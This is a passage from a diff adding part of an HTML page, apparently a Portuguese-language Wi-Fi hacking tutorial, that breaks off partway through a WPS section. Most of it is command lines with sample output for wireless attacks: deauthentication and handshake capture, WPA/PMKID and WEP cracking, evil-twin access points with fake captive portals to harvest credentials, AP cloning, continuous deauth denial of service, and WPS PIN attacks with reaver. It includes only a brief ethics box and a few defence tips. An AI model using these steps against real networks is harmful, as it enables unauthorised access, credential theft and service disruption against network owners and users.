+                <code><span class="cmd">sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w captura wlan0mon</span></code>
+                <code><span class="comment"># -c 6: Canal da rede</span></code>
+                <code><span class="comment"># --bssid: Endereço MAC do ponto de acesso</span></code>
+                <code><span class="comment"># -w captura: Prefixo do arquivo de saída</span></code>
+            </div>
+            
+            <p>Mantenha este terminal aberto e inicie um novo para forçar a desautenticação de um cliente conectado:</p>
+            
+            <div class="code-box">
+                <code><span class="cmd">sudo aireplay-ng --deauth 10 -a AA:BB:CC:DD:EE:FF -c 22:33:44:55:66:77 wlan0mon</span></code>
+                <code><span class="comment"># --deauth 10: Envia 10 pacotes de desautenticação</span></code>
+                <code><span class="comment"># -a: MAC do ponto de acesso</span></code>
+                <code><span class="comment"># -c: MAC do cliente (opcional)</span></code>
+                <code><span class="result">15:35:27 Sending DeAuth to station -- STMAC: [22:33:44:55:66:77]</span></code>
+            </div>
+            
+            <p>Quando o cliente tentar reconectar, um handshake será capturado. Você verá uma mensagem no primeiro terminal:</p>
+            
+            <div class="code-box">
+                <code><span class="result">CH 6 ][ Elapsed: 2 min ][ 2023-09-27 15:36 ][ <span class="highlight">WPA handshake: AA:BB:CC:DD:EE:FF</span></span></code>
+            </div>
+            
+            <div class="info-box tip">
+                <div class="info-box-title">Dica para Aumentar o Sucesso</div>
+                <p>Se não houver clientes conectados, você pode:</p>
+                <p>1. Esperar pacientemente até que um cliente se conecte<br>
+                2. Usar desautenticação global (sem especificar cliente)<br>
+                3. Tentar o ataque PMKID, que não exige clientes conectados</p>
+            </div>
+            
+            <h3 class="section-subtitle">Verificando a Captura do Handshake</h3>
+            <p>Para confirmar se o handshake foi capturado corretamente:</p>
+            
+            <div class="code-box">
+                <code><span class="cmd">sudo aircrack-ng captura-01.cap</span></code>
+                <code><span class="result">1 handshake found!</span></code>
+                <code><span class="result">Choosing first network as target.</span></code>
+            </div>
+        </section>
+
+        <section id="ataque-wpa" class="content-section">
+            <h2 class="section-title">Ataques de Força Bruta WPA/WPA2</h2>
+            <p>Com o handshake capturado, podemos tentar quebrar a senha da rede. Este processo envolve testes de força bruta ou ataques de dicionário contra o handshake capturado.</p>
+            
+            <h3 class="section-subtitle">Utilizando Aircrack-ng</h3>
+            <p>O método mais básico é usar o aircrack-ng com um arquivo de wordlist:</p>
+            
+            <div class="code-box">
+                <code><span class="cmd">sudo aircrack-ng -w /usr/share/wordlists/rockyou.txt captura-01.cap</span></code>
+                <code><span class="comment"># -w: Caminho para a wordlist</span></code>
+                <code><span class="result">Aircrack-ng 1.6</span></code>
+                <code><span class="result">Reading packets, please wait...</span></code>
+                <code><span class="result">Opening captura-01.cap</span></code>
+                <code><span class="result">Read 4532 packets.</span></code>
+                <code><span class="result">1 target found!</span></code>
+                <code><span class="result">                               Aircrack-ng will now start</span></code>
+                <code><span class="result">KEY FOUND! [ senha123 ]</span></code>
+                <code><span class="result">Master Key     : A1:B2:C3:D4:E5:F6:A7:B8:C9:D0:E1:F2:A3:B4:C5:D6</span></code>
+                <code><span class="result">Transient Key  : 00:11:22:33:44:55:66:77:88:99:AA:BB:CC:DD:EE:FF</span></code>
+            </div>
+            
+            <h3 class="section-subtitle">Usando Hashcat (Mais Rápido)</h3>
+            <p>Para quebras mais eficientes, especialmente quando se utiliza GPUs, o Hashcat é a melhor opção. Primeiro, converta o arquivo .cap para o formato HCCAPX:</p>
+            
+            <div class="code-box">
+                <code><span class="cmd">cap2hccapx captura-01.cap captura.hccapx</span></code>
+                <code><span class="result">Conversion successful: 1 handshake(s) written to captura.hccapx</span></code>
+            </div>
+            
+            <p>Agora execute o hashcat:</p>
+            
+            <div class="code-box">
+                <code><span class="cmd">hashcat -m 2500 -a 0 captura.hccapx /usr/share/wordlists/rockyou.txt --force</span></code>
+                <code><span class="comment"># -m 2500: Modo para WPA/WPA2</span></code>
+                <code><span class="comment"># -a 0: Ataque de dicionário</span></code>
+                <code><span class="result">hashcat (v6.1.1) starting...</span></code>
+                <code><span class="result">* Device #1: NVIDIA GeForce GTX 1660, 5980/6144 MB, 22MCU</span></code>
+                <code><span class="result">Dictionary cache built:</span></code>
+                <code><span class="result">* Filename..: /usr/share/wordlists/rockyou.txt</span></code>
+                <code><span class="result">* Passwords.: 14344385</span></code>
+                <code><span class="result">* Bytes.....: 139921507</span></code>
+                <code><span class="result">* Keyspace..: 14344385</span></code>
+                <code><span class="result">Session..........: hashcat</span></code>
+                <code><span class="result">Status...........: Cracked</span></code>
+                <code><span class="result">Hash.Name........: WPA-EAPOL-PBKDF2</span></code>
+                <code><span class="result">Hash.Target......: captura.hccapx</span></code>
+                <code><span class="result">Time.Started.....: Wed Sep 27 16:12:34 2023 (2 mins, 7 secs)</span></code>
+                <code><span class="result">Time.Estimated...: Wed Sep 27 16:14:41 2023 (0 secs)</span></code>
+                <code><span class="result">Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)</span></code>
+                <code><span class="result">Speed.#1.........:    25476 H/s (8.25ms) @ Accel:64 Loops:16 Thr:64 Vec:1</span></code>
+                <code><span class="result">Recovered........: 1/1 (100.00%) Digests</span></code>
+                <code><span class="result">Progress.........: 3244032/14344385 (22.61%)</span></code>
+                <code><span class="result">Rejected.........: 0/3244032 (0.00%)</span></code>
+                <code><span class="result">Restore.Point....: 3243008/14344385 (22.61%)</span></code>
+                <code><span class="result">Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1</span></code>
+                <code><span class="result">Candidates.#1....: senhafacil -> 123senhasegura</span></code>
+                <code><span class="result">Hardware.Mon.#1..: Temp: 67c Fan: 50% Util: 98% Core:1815MHz Mem:5000MHz Bus:8</span></code>
+                <code><span class="result">Recovered: senha123</span></code>
+            </div>
+            
+            <h3 class="section-subtitle">Criando Wordlists Customizadas</h3>
+            <p>Wordlists customizadas baseadas em informações da vítima podem aumentar significativamente a chance de sucesso:</p>
+            
+            <div class="code-box">
+                <code><span class="cmd">crunch 8 12 0123456789abcdefghijklmnopqrstuvwxyz -t nome%%%% -o wordlist_customizada.txt</span></code>
+                <code><span class="comment"># 8 12: Comprimento mínimo e máximo da senha</span></code>
+                <code><span class="comment"># -t: Padrão (% representa dígito)</span></code>
+                <code><span class="result">Crunch will now generate the following amount of data: 456976000 bytes</span></code>
+                <code><span class="result">456 MB</span></code>
+                <code><span class="result">0 GB</span></code>
+                <code><span class="result">crunch: 100% completed generating output</span></code>
+            </div>
+            
+            <div class="info-box warning">
+                <div class="info-box-title">Atenção</div>
+                <p>O tempo necessário para quebrar uma senha WPA/WPA2 depende de vários fatores:</p>
+                <p>• Complexidade da senha<br>
+                • Tamanho e qualidade da wordlist<br>
+                • Poder computacional disponível<br>
+                • Algoritmo e otimizações utilizadas</p>
+                <p>Senhas realmente fortes e aleatórias podem ser praticamente impossíveis de quebrar por força bruta.</p>
+            </div>
+        </section>
+
+        <section id="ataque-wep" class="content-section">
+            <h2 class="section-title">Ataques a Redes WEP</h2>
+            <p>Embora o WEP seja um protocolo legado e raramente utilizado atualmente devido às suas falhas críticas de segurança, o conhecimento sobre como comprometer redes WEP é valioso para compreender a evolução da segurança Wi-Fi.</p>
+            
+            <div class="info-box warning">
+                <div class="info-box-title">Obsoleto, mas ainda encontrado</div>
+                <p>O WEP (Wired Equivalent Privacy) foi oficialmente declarado obsoleto em 2004 pela Wi-Fi Alliance, mas ainda pode ser encontrado em dispositivos antigos e configurações legadas. Sua quebra é significativamente mais fácil que WPA/WPA2.</p>
+            </div>
+            
+            <h3 class="section-subtitle">Capturando IVs (Vetores de Inicialização)</h3>
+            <p>O ataque WEP depende da coleta de IVs suficientes para determinar a chave. Primeiro, identifique a rede WEP:</p>
+            
+            <div class="code-box">
+                <code><span class="cmd">sudo airodump-ng wlan0mon</span></code>
+                <code><span class="comment"># Procure redes com ENC = WEP</span></code>
+                <code><span class="cmd">sudo airodump-ng -c 1 --bssid AA:BB:CC:DD:EE:FF -w wep_captura wlan0mon</span></code>
+                <code><span class="comment"># Substitua o canal e BSSID pelos da rede alvo</span></code>
+            </div>
+            
+            <h3 class="section-subtitle">Associação Falsa</h3>
+            <p>Para acelerar a captura de IVs, podemos usar a técnica de associação falsa:</p>
+            
+            <div class="code-box">
+                <code><span class="cmd">sudo aireplay-ng --fakeauth 0 -a AA:BB:CC:DD:EE:FF -h 00:11:22:33:44:55 wlan0mon</span></code>
+                <code><span class="comment"># -h: MAC da sua interface (verifique com macchanger -s wlan0mon)</span></code>
+                <code><span class="result">17:05:43 Sending Authentication Request (Open System) [ACK]</span></code>
+                <code><span class="result">17:05:43 Authentication successful</span></code>
+                <code><span class="result">17:05:43 Sending Association Request [ACK]</span></code>
+                <code><span class="result">17:05:43 Association successful :-)</span></code>
+            </div>
+            
+            <h3 class="section-subtitle">Injeção de Pacotes ARP</h3>
+            <p>A injeção de pacotes ARP é a técnica mais eficiente para gerar tráfego e coletar IVs:</p>
+            
+            <div class="code-box">
+                <code><span class="cmd">sudo aireplay-ng --arpreplay -b AA:BB:CC:DD:EE:FF -h 00:11:22:33:44:55 wlan0mon</span></code>
+                <code><span class="result">Waiting for beacon frame (BSSID: AA:BB:CC:DD:EE:FF) on channel 1</span></code>
+                <code><span class="result">17:07:16 Sending ARP request [ACK]</span></code>
+                <code><span class="result">17:07:16 Sending ARP request [ACK]</span></code>
+                <code><span class="result">Sent 256 packets...</span></code>
+                <code><span class="result">Got a deauth/disassoc packet. Is the source MAC associated?</span></code>
+            </div>
+            
+            <p>Mantenha este processo até coletar IVs suficientes (normalmente 20.000-50.000). No terminal do airodump-ng, você verá o número de "Data" aumentando.</p>
+            
+            <h3 class="section-subtitle">Quebrando a Chave WEP</h3>
+            <p>Após coletar IVs suficientes, use o aircrack-ng para quebrar a chave:</p>
+            
+            <div class="code-box">
+                <code><span class="cmd">sudo aircrack-ng wep_captura-01.cap</span></code>
+                <code><span class="result">Opening wep_captura-01.cap</span></code>
+                <code><span class="result">Read 35621 packets.</span></code>
+                <code><span class="result">#  BSSID              ESSID                     Encryption</span></code>
+                <code><span class="result">1  AA:BB:CC:DD:EE:FF  RedeWEP                   WEP (42581 IVs)</span></code>
+                <code><span class="result">Choosing first network as target.</span></code>
+                <code><span class="result">Aircrack-ng 1.6</span></code>
+                <code><span class="result">[00:00:12] Tested 1535896 keys (got 42581 IVs)</span></code>
+                <code><span class="result">KB    depth   byte(vote)</span></code>
+                <code><span class="result">0    0/ 8   AE(53696) 35(45056) 63(44800) 9A(44288) 98(43264)</span></code>
+                <code><span class="result">1    0/ 1   37(59136) C9(50432) E1(49408) 8A(48640) 6F(48128)</span></code>
+                <code><span class="result">2    0/ 1   B3(60928) CF(50688) FC(50176) 01(49664) 87(49408)</span></code>
+                <code><span class="result">3    0/ 2   D4(54528) 4C(48640) 6A(47872) A6(47616) D2(47104)</span></code>
+                <code><span class="result">4    0/ 5   10(49664) BC(48896) FB(48640) A1(48384) 39(47872)</span></code>
+                <code><span class="result">KEY FOUND! [ AE:37:B3:D4:10 ] (ASCII: .7...)  </span></code>
+                <code><span class="result">Decrypted correctly: 100%</span></code>
+            </div>
+            
+            <div class="info-box tip">
+                <div class="info-box-title">Dica Prática</div>
+                <p>Outras técnicas úteis para acelerar a captura de IVs:</p>
+                <p>• Ataque Fragmentação: <code>sudo aireplay-ng --fragment -b [BSSID] wlan0mon</code><br>
+                • Ataque ChopChop: <code>sudo aireplay-ng --chopchop -b [BSSID] wlan0mon</code><br>
+                • Ataques Interativos: <code>sudo aireplay-ng --interactive -b [BSSID] wlan0mon</code></p>
+            </div>
+        </section>
+
+        <section id="ataque-pmkid" class="content-section">
+            <h2 class="section-title">Ataque PMKID</h2>
+            <p>O ataque PMKID, descoberto em 2018, permite capturar informações para quebra de senha WPA/WPA2 sem necessidade de handshake completo ou clientes conectados, representando uma evolução significativa nos métodos de auditoria Wi-Fi.</p>
+            
+            <div class="info-box">
+                <div class="info-box-title">Vantagem Principal</div>
+                <p>A principal vantagem do ataque PMKID é que ele não exige a presença de clientes conectados à rede. Basta o ponto de acesso estar ativo e suportar o roaming 802.11r (muitos APs modernos suportam).</p>
+            </div>
+            
+            <h3 class="section-subtitle">Capturando PMKID com Hcxdumptool</h3>
+            <p>O hcxdumptool é a ferramenta mais eficaz para capturar PMKID:</p>
+            
+            <div class="code-box">
+                <code><span class="cmd">sudo apt install hcxdumptool hcxtools</span> <span class="comment"># Instala as ferramentas necessárias</span></code>
+                <code><span class="cmd">sudo hcxdumptool -i wlan0mon -o pmkid_captura.pcapng --enable_status=1</span></code>
+                <code><span class="result">initialization...</span></code>
+                <code><span class="result">start capturing (stop with ctrl+c)</span></code>
+                <code><span class="result">INTERFACE:................: wlan0mon</span></code>
+                <code><span class="result">FILTERLIST...............: 0 entries</span></code>
+                <code><span class="result">FILTERMODE...............: unused</span></code>
+                <code><span class="result">WEAK CANDIDATE...........: 12345678</span></code>
+                <code><span class="result">INFO: cha=1, rx=3, rx(dropped)=0, tx=2, powned=1, err=0</span></code>
+                <code><span class="result">INFO: cha=1, rx=5, rx(dropped)=0, tx=4, powned=2, err=0</span></code>
+            </div>
+            
+            <p>O processo pode levar algum tempo. Quando vir a mensagem "powned", isso indica que um PMKID foi capturado. Pressione Ctrl+C para parar a captura após algum sucesso.</p>
+            
+            <h3 class="section-subtitle">Convertendo e Quebrando o PMKID</h3>
+            <p>Após a captura, converta o arquivo para o formato compatível com hashcat:</p>
+            
+            <div class="code-box">
+                <code><span class="cmd">sudo hcxpcapngtool -o pmkid_hash.16800 pmkid_captura.pcapng</span></code>
+                <code><span class="result">reading from pmkid_captura.pcapng...</span></code>
+                <code><span class="result">PMKIDs...........: 3 written to pmkid_hash.16800</span></code>
+                <code><span class="result">EAPOL pairs......: 0 written to pmkid_hash.16800</span></code>
+            </div>
+            
+            <p>Agora utilize o hashcat para quebrar o hash PMKID:</p>
+            
+            <div class="code-box">
+                <code><span class="cmd">hashcat -m 16800 -a 0 pmkid_hash.16800 /usr/share/wordlists/rockyou.txt --force</span></code>
+                <code><span class="comment"># -m 16800: Modo para PMKID</span></code>
+                <code><span class="result">hashcat (v6.1.1) starting...</span></code>
+                <code><span class="result">* Device #1: NVIDIA GeForce GTX 1660, 5980/6144 MB, 22MCU</span></code>
+                <code><span class="result">Dictionary cache built:</span></code>
+                <code><span class="result">* Filename..: /usr/share/wordlists/rockyou.txt</span></code>
+                <code><span class="result">* Passwords.: 14344385</span></code>
+                <code><span class="result">* Bytes.....: 139921507</span></code>
+                <code><span class="result">* Keyspace..: 14344385</span></code>
+                <code><span class="result">Session..........: hashcat</span></code>
+                <code><span class="result">Status...........: Cracked</span></code>
+                <code><span class="result">Hash.Name........: WPA-PMKID-PBKDF2</span></code>
+                <code><span class="result">Hash.Target......: pmkid_hash.16800</span></code>
+                <code><span class="result">Recovered........: 1/3 (33.33%) Digests</span></code>
+                <code><span class="result">Progress.........: 5781504/43033155 (13.44%)</span></code>
+                <code><span class="result">Restored: senha12345</span></code>
+            </div>
+            
+            <div class="info-box tip">
+                <div class="info-box-title">Alternativa Automatizada: Wifite</div>
+                <p>O Wifite (versão 2 ou superior) inclui suporte para ataques PMKID automatizados:</p>
+                <p><code>sudo wifite --pmkid</code></p>
+                <p>Esta opção simplifica todo o processo, gerenciando a captura e conversão automaticamente.</p>
+            </div>
+        </section>
+
+        <section id="redes-falsas" class="content-section">
+            <h2 class="section-title">Criação de Redes Falsas (Evil Twin)</h2>
+            <p>O ataque Evil Twin envolve a criação de um ponto de acesso falso que imita uma rede legítima, permitindo interceptar o tráfego dos usuários que se conectam a ele. Esta técnica é particularmente eficaz para capturas de credenciais e ataques Man-in-the-Middle.</p>
+            
+            <div class="info-box danger">
+                <div class="info-box-title"><i class="fas fa-exclamation-triangle"></i> Uso Ético</div>
+                <p>A criação de redes falsas é uma técnica invasiva que pode impactar outros usuários. Use apenas em ambientes controlados, com permissão explícita e para fins educativos legítimos.</p>
+            </div>
+            
+            <h3 class="section-subtitle">Método 1: Usando o Airbase-ng</h3>
+            <p>O airbase-ng permite criar um ponto de acesso falso diretamente do Kali Linux:</p>
+            
+            <div class="code-box">
+                <code><span class="cmd">sudo airmon-ng check kill</span> <span class="comment"># Mata processos conflitantes</span></code>
+                <code><span class="cmd">sudo airbase-ng -e "RedeWiFi" -c 6 wlan0mon</span></code>
+                <code><span class="comment"># -e: Nome da rede (ESSID)</span></code>
+                <code><span class="comment"># -c: Canal</span></code>
+                <code><span class="result">18:45:23  Created tap interface at0</span></code>
+                <code><span class="result">18:45:23  Trying to set MTU on at0 to 1500</span></code>
+                <code><span class="result">18:45:23  Access Point with BSSID 00:11:22:33:44:55 started.</span></code>
+            </div>
+            
+            <p>Após criar o AP, configure a interface para fornecer DHCP:</p>
+            
+            <div class="code-box">
+                <code><span class="cmd">sudo ifconfig at0 up 192.168.1.1 netmask 255.255.255.0</span></code>
+                <code><span class="cmd">sudo route add -net 192.168.1.0 netmask 255.255.255.0 gw 192.168.1.1</span></code>
+            </div>
+            
+            <h3 class="section-subtitle">Método 2: Usando o Airgeddon (Mais Completo)</h3>
+            <p>O Airgeddon automatiza todo o processo de criação de Evil Twin com portal captivo:</p>
+            
+            <div class="code-box">
+                <code><span class="cmd">git clone https://github.com/v1s1t0r1sh3r3/airgeddon.git</span></code>
+                <code><span class="cmd">cd airgeddon</span></code>
+                <code><span class="cmd">sudo bash airgeddon.sh</span></code>
+                <code><span class="comment"># Siga os menus interativos:</span></code>
+                <code><span class="comment"># 1. Selecione sua interface</span></code>
+                <code><span class="comment"># 2. Ative o modo monitor</span></code>
+                <code><span class="comment"># 3. Escolha a opção Evil Twin</span></code>
+                <code><span class="comment"># 4. Selecione o portal captivo</span></code>
+            </div>
+            
+            <h3 class="section-subtitle">Método 3: Portal Captivo com Wifiphisher</h3>
+            <p>O Wifiphisher é especializado em criar Evil Twins com portais captivos convincentes:</p>
+            
+            <div class="code-box">
+                <code><span class="cmd">sudo apt install wifiphisher</span></code>
+                <code><span class="cmd">sudo wifiphisher</span></code>
+                <code><span class="comment"># Interface gráfica será exibida para seleção da rede alvo</span></code>
+                <code><span class="comment"># Escolha o tipo de ataque (Portal Update, OAuth login, etc.)</span></code>
+            </div>
+            
+            <h3 class="section-subtitle">Criando um Portal Captivo Personalizado</h3>
+            <p>Para ataques mais avançados, você pode criar portais captivos personalizados que imitam sites legítimos:</p>
+            
+            <div class="code-box">
+                <code><span class="cmd">sudo apt install apache2</span></code>
+                <code><span class="cmd">sudo service apache2 start</span></code>
+                <code><span class="cmd">sudo mkdir -p /var/www/html/portal</span></code>
+                <code><span class="cmd">sudo nano /var/www/html/portal/index.html</span></code>
+                <code><span class="comment"># Crie um portal de login falso que se assemelhe ao portal alvo</span></code>
+                <code><span class="cmd">sudo nano /var/www/html/portal/captura.php</span></code>
+                <code><span class="comment"># Código PHP para salvar as credenciais inseridas</span></code>
+            </div>
+            
+            <div class="info-box warning">
+                <div class="info-box-title">Detecção e Defesa</div>
+                <p>Usuários atentos podem detectar Evil Twins através de:</p>
+                <p>• Rede aberta quando a original exige senha<br>
+                • Diferenças na intensidade do sinal<br>
+                • MAC address do ponto de acesso diferente<br>
+                • Certificados inválidos em portais HTTPS</p>
+            </div>
+        </section>
+
+        <section id="ap-clone" class="content-section">
+            <h2 class="section-title">Clonagem de Pontos de Acesso</h2>
+            <p>A clonagem de pontos de acesso vai além do Evil Twin básico, reproduzindo com precisão todas as características do AP original, incluindo MAC address, canal, e outras configurações.</p>
+            
+            <h3 class="section-subtitle">Identificando Características para Clonagem</h3>
+            <p>Primeiro, colete todas as informações relevantes do AP alvo:</p>
+            
+            <div class="code-box">
+                <code><span class="cmd">sudo airodump-ng wlan0mon</span></code>
+                <code><span class="comment"># Anote: BSSID, Canal, ESSID, Tipo de criptografia</span></code>
+            </div>
+            
+            <h3 class="section-subtitle">Clonagem com Airbase-ng</h3>
+            <p>Configure o airbase-ng para clonar perfeitamente o AP:</p>
+            
+            <div class="code-box">
+                <code><span class="cmd">sudo macchanger --mac=AA:BB:CC:DD:EE:FF wlan0mon</span> <span class="comment"># Clone o MAC do AP alvo</span></code>
+                <code><span class="cmd">sudo airbase-ng -a AA:BB:CC:DD:EE:FF -e "RedeWiFi" -c 6 -Z 4 wlan0mon</span></code>
+                <code><span class="comment"># -a: MAC address a emular</span></code>
+                <code><span class="comment"># -e: ESSID da rede alvo</span></code>
+                <code><span class="comment"># -c: Canal da rede alvo</span></code>
+                <code><span class="comment"># -Z 4: Emular WPA2-PSK</span></code>
+                <code><span class="result">19:12:45  Created tap interface at0</span></code>
+                <code><span class="result">19:12:45  Trying to set MTU on at0 to 1500</span></code>
+                <code><span class="result">19:12:45  Access Point with BSSID AA:BB:CC:DD:EE:FF started.</span></code>
+            </div>
+            
+            <h3 class="section-subtitle">Clonagem Avançada com Mdk4</h3>
+            <p>O MDK4 oferece capacidades avançadas para clonagem de vários APs simultaneamente:</p>
+            
+            <div class="code-box">
+                <code><span class="cmd">sudo apt install mdk4</span></code>
+                <code><span class="cmd">echo "RedeWiFi" > ssids.txt</span></code>
+                <code><span class="cmd">sudo mdk4 wlan0mon b -f ssids.txt -a -g -w</span></code>
+                <code><span class="comment"># b: Modo Beacon Flood</span></code>
+                <code><span class="comment"># -f: Arquivo com SSIDs</span></code>
+                <code><span class="comment"># -a: Inclui autenticação</span></code>
+                <code><span class="comment"># -g: Válido para ambos 802.11b/g</span></code>
+                <code><span class="comment"># -w: WPA2 encryption flag</span></code>
+            </div>
+            
+            <h3 class="section-subtitle">Clonagem com Ataque de Desautenticação</h3>
+            <p>Para ser mais eficaz, combine a clonagem com desautenticação para forçar a conexão ao AP clonado:</p>
+            
+            <div class="code-box">
+                <code><span class="cmd">sudo aireplay-ng --deauth 0 -a AA:BB:CC:DD:EE:FF wlan0mon</span> <span class="comment"># Deauth contínuo</span></code>
+                <code><span class="comment"># Em outro terminal, mantenha o AP clonado rodando</span></code>
+            </div>
+            
+            <div class="info-box">
+                <div class="info-box-title">Uso de Múltiplas Interfaces</div>
+                <p>Para clonagem mais eficaz, use duas interfaces sem fio:</p>
+                <p>• Uma para monitorar e enviar desautenticação ao AP original<br>
+                • Outra para hospedar o AP clonado<br>
+                Este método elimina interferências e melhora a confiabilidade do ataque.</p>
+            </div>
+        </section>
+
+        <section id="desautenticacao" class="content-section">
+            <h2 class="section-title">Ataques de Desautenticação</h2>
+            <p>O ataque de desautenticação explora uma falha no protocolo 802.11 que permite enviar pacotes forjados para desconectar clientes de um ponto de acesso. Este ataque é útil para capturar handshakes, mas também pode ser usado como um ataque de negação de serviço.</p>
+            
+            <h3 class="section-subtitle">Desautenticação Direcionada</h3>
+            <p>Para desautenticar um cliente específico de uma rede:</p>
+            
+            <div class="code-box">
+                <code><span class="cmd">sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF wlan0mon</span> <span class="comment"># Identifique o cliente</span></code>
+                <code><span class="cmd">sudo aireplay-ng --deauth 5 -a AA:BB:CC:DD:EE:FF -c 22:33:44:55:66:77 wlan0mon</span></code>
+                <code><span class="comment"># --deauth 5: Envia 5 pacotes (use 0 para envio contínuo)</span></code>
+                <code><span class="comment"># -a: BSSID do AP</span></code>
+                <code><span class="comment"># -c: MAC do cliente alvo</span></code>
+                <code><span class="result">20:05:17 Sending DeAuth to station -- STMAC: [22:33:44:55:66:77]</span></code>
+                <code><span class="result">20:05:17 Sending DeAuth to station -- STMAC: [22:33:44:55:66:77]</span></code>
+                <code><span class="result">20:05:18 Sending DeAuth to station -- STMAC: [22:33:44:55:66:77]</span></code>
+            </div>
+            
+            <h3 class="section-subtitle">Desautenticação em Massa</h3>
+            <p>Para desautenticar todos os clientes de uma rede ao mesmo tempo:</p>
+            
+            <div class="code-box">
+                <code><span class="cmd">sudo aireplay-ng --deauth 10 -a AA:BB:CC:DD:EE:FF wlan0mon</span></code>
+                <code><span class="comment"># Sem o parâmetro -c, todos os clientes são afetados</span></code>
+                <code><span class="result">20:07:32 Sending DeAuth to broadcast -- BSSID: [AA:BB:CC:DD:EE:FF]</span></code>
+                <code><span class="result">20:07:33 Sending DeAuth to broadcast -- BSSID: [AA:BB:CC:DD:EE:FF]</span></code>
+            </div>
+            
+            <h3 class="section-subtitle">Ataque Contínuo (DoS)</h3>
+            <p>Para um ataque de negação de serviço contínuo, enviando desautenticações constantemente:</p>
+            
+            <div class="code-box">
+                <code><span class="cmd">sudo aireplay-ng --deauth 0 -a AA:BB:CC:DD:EE:FF wlan0mon</span></code>
+                <code><span class="comment"># 0 significa envio contínuo de pacotes</span></code>
+                <code><span class="result">20:10:15 Sending DeAuth to broadcast -- BSSID: [AA:BB:CC:DD:EE:FF]</span></code>
+                <code><span class="result">20:10:16 Sending DeAuth to broadcast -- BSSID: [AA:BB:CC:DD:EE:FF]</span></code>
+                <code><span class="result">20:10:17 Sending DeAuth to broadcast -- BSSID: [AA:BB:CC:DD:EE:FF]</span></code>
+                <code><span class="comment"># Pressione Ctrl+C para parar</span></code>
+            </div>
+            
+            <h3 class="section-subtitle">Automação com MDK4</h3>
+            <p>O MDK4 oferece recursos avançados para ataques de desautenticação:</p>
+            
+            <div class="code-box">
+                <code><span class="cmd">sudo mdk4 wlan0mon d -B AA:BB:CC:DD:EE:FF -c 6</span></code>
+                <code><span class="comment"># d: Modo de desautenticação</span></code>
+                <code><span class="comment"># -B: BSSID do AP alvo</span></code>
+                <code><span class="comment"># -c: Canal</span></code>
+            </div>
+            
+            <h3 class="section-subtitle">Ataque com Wifijammer</h3>
+            <p>O Wifijammer é uma ferramenta especializada em ataques de desautenticação:</p>
+            
+            <div class="code-box">
+                <code><span class="cmd">git clone https://github.com/DanMcInerney/wifijammer.git</span></code>
+                <code><span class="cmd">cd wifijammer</span></code>
+                <code><span class="cmd">sudo python wifijammer.py -a AA:BB:CC:DD:EE:FF -i wlan0mon</span></code>
+                <code><span class="comment"># -a: MAC do AP (opcional, sem ele ataca todas as redes)</span></code>
+                <code><span class="comment"># -i: Interface em modo monitor</span></code>
+            </div>
+            
+            <div class="info-box warning">
+                <div class="info-box-title">Mitigação e Proteção</div>
+                <p>A partir do padrão 802.11w (Management Frame Protection), algumas redes são protegidas contra ataques de desautenticação. Mas a maioria dos APs domésticos e muitos comerciais ainda são vulneráveis. A principal defesa é identificar a origem dos pacotes de desautenticação e bloquear fisicamente o atacante.</p>
+            </div>
+        </section>
+
+        <section id="wps" class="content-section">
+            <h2 class="section-title">Ataques a WPS</h2>
+            <p>O Wi-Fi Protected Setup (WPS) foi criado para simplificar a conexão de dispositivos a redes Wi-Fi protegidas, mas introduziu vulnerabilidades que podem ser exploradas para obter acesso não autorizado.</p>
+            
+            <h3 class="section-subtitle">Verificando Redes com WPS Ativo</h3>
+            <p>Primeiro, identifique redes com WPS habilitado:</p>
+            
+            <div class="code-box">
+                <code><span class="cmd">sudo wash -i wlan0mon</span></code>
+                <code><span class="result">BSSID       Ch  dBm  WPS  Lck  Vendor    ESSID</span></code>
+                <code><span class="result">-------------------------------------------------</span></code>
+                <code><span class="result">AA:BB:CC:DD:EE:FF  6  -58  1.0  No   TP-Link   RedeWiFi</span></code>
+                <code><span class="result">11:22:33:44:55:66  1  -72  2.0  Yes  Netgear   OutraRede</span></code>
+                <code><span class="comment"># Lck = No: Rede sem bloqueio de PIN (vulnerável)</span></code>
+            </div>
+            
+            <h3 class="section-subtitle">Ataque Pixie Dust</h3>
+            <p>O ataque Pixie Dust explora vulnerabilidades em implementações WPS para recuperar o PIN em segundos:</p>
+            
+            <div class="code-box">
+                <code><span class="cmd">sudo apt install reaver</span></code>
+                <code><span class="cmd">sudo reaver -i wlan0mon -b AA:BB:CC:DD:EE:FF -K 1 -vv</span></code>
+                <code><span class="comment"># -K 1: Ativa o ataque Pixie Dust</span></code>
+                <code><span class="comment"># -vv: Modo verbose</span></code>
+                <code><span class="result">Reaver v1.6.5 WiFi Protected Setup Attack Tool</span></code>
+                <code><span class="result">Copyright (c) 2011, Tactical Network Solutions, Craig Heffner</span></code>
+                <code><span class="result">[+] Switching wlan0mon to channel 6</span></code>
+                <code><span class="result">[+] Starting Pixie Dust attack against AA:BB:CC:DD:EE:FF</span></code>
+                <code><span class="result">[+] Trying pin "12345670"</span></code>
+                <code><span class="result">[+] WPS PIN: '12345670'</span></code>
+                <code><span class="result">[+] WPA PSK: 'senhadarede123'</span></code>
+                <code><span class="result">[+] AP SSID: 'RedeWiFi'</span></code>
+            </div>
+            
+            <h3 class="section-subtitle">Ataque de Força Bruta WPS</h3>
+            <p>Se o Pixie Dust falhar, tente a força bruta tradicional (pode levar horas):</p>
+            
+            <div class="code-box">
+                <code><span class="cmd">sudo reaver -i wlan0mon -b AA:BB:CC:DD:EE:FF -vv</span></code>
+                <code><span class="comment"># Sem -K, realiza força bruta padrão</span></code>
+                <code><span class="result">[+] Trying pin "12345670"</span></code>
+                <code><span class="result">[-] Pin "12345670" failed</span></code>
+                <code><span class="result">[+] Trying pin "87654321"</span></code>
+                <code><span class="comment"># Este processo testa todos os PINs possíveis</span></code>
+            </div>
+            
+            <h3 class="section-subtitle">Automatização com Wifite</h3>
+            <p>O Wifite pode automatizar ataques WPS, tentando primeiro Pixie Dust e depois força bruta:</p>
+            
+            <div class="code-box">
+                <code><span class="cmd">sudo wifite --wps -i wlan0mon</span></code>
+<code><span class="comment"># --wps: Foca apenas em redes com WPS habilitado</span></code>
+            </div>
+            
+            <h3 class="section-subtitle">Ataque OneShot com Bully</h3>
+            <p>O Bully é outra ferramenta eficaz para explorar vulnerabilidades WPS:</p>
+            
+            <div class="code-box">
+                <code><span class="cmd">sudo apt install bully</span></code>
